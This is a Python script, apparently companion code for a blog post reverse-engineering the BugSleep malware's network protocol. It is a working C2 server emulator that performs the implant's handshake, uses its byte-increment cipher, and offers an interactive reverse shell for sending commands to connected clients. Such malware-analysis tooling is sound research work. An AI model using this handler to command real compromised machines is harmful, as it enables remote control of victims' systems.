#!/usr/bin/env python3

import argparse
import os
import signal
import socket
import sys
import time
from typing import List

VERBOSE_LEVEL: int = 0
server_socket = None

""" 
Companion code for blog article 
    [BugSleep network protocol reversing](https://raw-data.gitlab.io/post/bugsleep_netprotocol/)
"""


def verbose_print(level: int, message: str) -> None:
    """
    Set verbosity level.

    :param level: Message verbosity level.
    :type level: int
    :param message: Message to print.
    :type message: str
    """
    if VERBOSE_LEVEL >= level:
        print(message)


def hexdump(data: bytes, length: int = 16) -> None:
    """
    Prints data in hexdump style.

    :param data: Data to be hexdumped.
    :type data: bytes
    :param length: Number of bytes per line.
    :type length: int
    """
    for i in range(0, len(data), length):
        sub_data = data[i : i + length]
        hex_string = " ".join(f"{byte:02X}" for byte in sub_data)
        ascii_string = "".join(
            chr(byte) if 32 <= byte < 127 else "." for byte in sub_data
        )
        print(f"\t\t{i:08X}  {hex_string:<{length * 3}}  {ascii_string}")


def encrypt_message(message: bytes, increment: int = 3) -> bytes:
    """
    Encrypt a message by adding a fixed increment to each byte.
    This can come in handy if BugSleep uses a different increment
    value.

    :param message: Message to encrypt.
    :type message: bytes
    :param increment: Increment value to add to each byte.
    :type increment: int
    :return: Encrypted message.
    :rtype: bytes
    """
    return bytes((byte + increment) % 256 for byte in message)


def decrypt_message(message: bytes, increment: int = 3) -> bytes:
    """
    Decrypts a message by adding a fixed increment to each byte.
    Here again, the `increment` can be set to another value
    depending on the analyzed BugSleep sample.

    This function is used to account for the BugSleep bug logic
    during C2 communication, but it's basically the same as
    `encrypt_message`.

    :param message: Message to decrypt.
    :type message: bytes
    :param increment: Increment value to add to each byte.
    :type increment: int
    :return: Decrypted message.
    :rtype: bytes
    """
    return bytes((byte + increment) % 256 for byte in message)


def pack_cmd(command: str, increment: int = 3) -> bytes:
    """
    Packs a command into a length-prefixed encrypted format.

    :param command: Command to pack.
    :type command: str
    :param increment: Increment value used to encrypt the message.
    :type increment: int
    :return: Packed and encrypted command.
    :rtype: bytes
    """
    try:
        msg: bytes = command.encode("ascii")
        msg_length: int = len(msg)
        size_bytes: bytes = bytes([(msg_length + increment) % 256]) + bytes(
            [(0x00 + increment) % 256] * 3
        )

        encrypted_cmd: bytes = bytes((b + increment) % 256 for b in msg)

        return size_bytes + encrypted_cmd
    except Exception as err:
        print(f"Error: {err}")

    return b""


def parse_msg_length(header: bytes, increment: int) -> int:
    """
    Function to parse and adjusts the first 4 bytes to determine message length.

    :param header: First 4 bytes received.
    :type header: bytes
    :param increment: Increment value used in decryption.
    :type increment: int
    :return: Message length.
    :rtype: int
    """
    adjusted_header: bytes = bytes((b + increment) & 0xFF for b in header)
    return adjusted_header[0]


def send_packed_cmd(client_socket: socket.socket, command: str, increment: int) -> None:
    """
    Send a packed command (length + encryption) to the client (reverse shell).

    :param client_socket: The client socket.
    :type client_socket: socket.socket
    :param command: Command to send.
    :type command: str
    :param increment: Increment value used for encryption.
    :type increment: int
    """
    packed_cmd: bytes = pack_cmd(command, increment)

    verbose_print(
        2,
        f"\n[BugSleepC2] Sending packed command '{command}' (hexdump and ASCII view):",
    )
    if VERBOSE_LEVEL >= 3:
        hexdump(packed_cmd)

    client_socket.sendall(packed_cmd)


def recv_and_display_stdout(client_socket: socket.socket, increment: int) -> bool:
    """
    Received and process stdout sent by the client

    :param client_socket: Client socket.
    :type client_socket: socket.socket
    :param increment: Increment value used in decryption.
    :type increment: int
    :return: True if successful, False otherwise.
    :rtype: bool
    """
    try:
        data_chunks: List[bytes] = []
        while True:
            data: bytes = client_socket.recv(1024)
            if not data:
                # if we do not get any data, connection might have closed
                # so, return False
                return False

            decrypted_chunk: bytes = decrypt_message(data, increment)
            data_chunks.append(decrypted_chunk)

            # Instead to surgically check every packet
            # let's look for the end message marker
            # as describe in the blog article
            if decrypted_chunk.endswith(b"\x00\x00\x00\x00"):
                break

        full_data: bytes = b"".join(data_chunks)

        #! this part it not ideal, but it works, so we simply remove some unwanted chars
        clean_data: bytes = full_data.strip(b"\x00").replace(b"\r\n", b"\n")

        print(clean_data.decode("utf-8", errors="replace"))

        return True
    except Exception as err:
        print(f"[Error] Exception occurred while receiving data: {err}")
        return False


def signal_handler() -> None:
    """
    Handles graceful shutdown on interrupt signals.

    """
    import struct

    print("\n[BugSleepC2Emulator] Shutting down gracefully...")
    if server_socket:
        #! force socket to close with SO_LINGER and ensure port is freed
        # h/t https://stackoverflow.com/questions/46264404/how-can-i-reset-a-tcp-socket-in-python
        server_socket.setsockopt(
            socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)
        )
        server_socket.close()
    sys.exit(0)


def handle_client_conn(client_socket: socket.socket, increment: int) -> None:
    """
    Handles the client connection, and C2 dispatcher logic, e.g. which command
    to trigger on the client side.

    :param client_socket: Client socket.
    :type client_socket: socket.socket
    :param increment: Increment value used in encrypt/decrypt messages (it may
    change across BugSleep versions).
    :type increment: int
    """
    try:
        verbose_print(1, "\n[Phase 1] Receiving the first message from client...")
        header: bytes = client_socket.recv(4)
        if len(header) < 4:
            print("  [Error] Incomplete header received.")
            return

        msg_length: int = parse_msg_length(header, increment)
        verbose_print(2, f"\t[Phase 1] Expected message length: {msg_length} bytes")

        data: bytes = client_socket.recv(msg_length)
        if len(data) < msg_length:
            print("  [Error] Incomplete data received.")
            return

        adjusted_data: bytes = bytes((b + increment) % 256 for b in data)
        verbose_print(2, "  [Phase 1] Received data (hexdump and ASCII view):")
        if VERBOSE_LEVEL >= 3:
            hexdump(adjusted_data)
        else:
            verbose_print(2, f"\tData: {adjusted_data.decode(errors='replace')}")

        verbose_print(1, "\n[Phase 2] Sending 4 random bytes back to the client...")
        random_bytes: bytes = os.urandom(4)
        client_socket.sendall(random_bytes)

        time.sleep(1)

        verbose_print(1, "\n[Phase 3] Sending the initial message to the client...")
        base_value: int = 2 + 0x01
        first_four_bytes: bytes = bytes([base_value + 0x03, 0x03, 0x03, 0x03])
        final_message: bytes = first_four_bytes
        client_socket.sendall(final_message)

        verbose_print(1, "[Shell] Interactive shell started. Type 'terminate' to exit.")

        while True:
            if not recv_and_display_stdout(client_socket, increment):
                break

            command: str = input(
                "[Shell] Enter a command ('terminate' to exit): "
            ).strip()

            # Handle terminate msg if sent by the BugSleep operator
            if command.lower() == "terminate":
                verbose_print(1, "[Shell] Terminating the session...")
                break

            send_packed_cmd(client_socket, command, increment)

            if not recv_and_display_stdout(client_socket, increment):
                break

    except Exception as e:
        print(f"  [Error] Unhandled exception triggered: {e}")
    finally:
        verbose_print(1, "[Connection] Closing client connection.")
        client_socket.close()


def start_server(host: str = "0.0.0.0", port: int = 443, increment: int = 3) -> None:
    """
    Main function to handle client connections.

    :param host: Address to bind to.
    :type host: str
    :param port: TCP port to bind to.
    :type port: int
    :param increment: Increment value used in encrypt/decrypt messages (it may
    change across BugSleep versions).
    :type increment: int
    """
    global server_socket

    #! register the signal handler (mange e.g. Ctrl+C) and clean-up stuff
    #! to avoid issues on port binding when running in Linux
    try:
        signal.signal(signal.SIGINT, signal_handler)
    except ValueError:
        print("[Warning] Signal handling no fully supported on this OS.")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
    except OSError as err:
        print(f"[BugSleepC2] Error binding to {host}:{port} - {err}")
        sys.exit(1)
    server_socket.listen(5)
    verbose_print(1, f"[BugSleepC2] Listening on {host}:{port}")

    try:
        while True:
            client_socket, address = server_socket.accept()
            verbose_print(
                1, f"\n[Connection] Accepted connection from client: {address}"
            )
            handle_client_conn(client_socket, increment)
    except Exception as e:
        print(f"\n[BugSleepC2] Error: {e}")
    finally:
        verbose_print(1, "[BugSleepC2] Closing server socket...")
        server_socket.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Simple BugSleep C2 emulator - Reverse Shell Handler"
    )
    parser.add_argument(
        "--host",
        type=str,
        default="0.0.0.0",
        help="Host address to bind to. (default: %(default)s)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=443,
        help="TCP port to bind to. (default: %(default)s)",
    )
    parser.add_argument(
        "--increment",
        type=int,
        default=0x03,
        help="Increment to add to bytes. (default: %(default)s). Use the value discoverd while RE BugSleep.",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Set verbosity level.",
    )

    args = parser.parse_args()

    VERBOSE_LEVEL = args.verbose

    #! let's rock
    start_server(host=args.host, port=args.port, increment=args.increment)
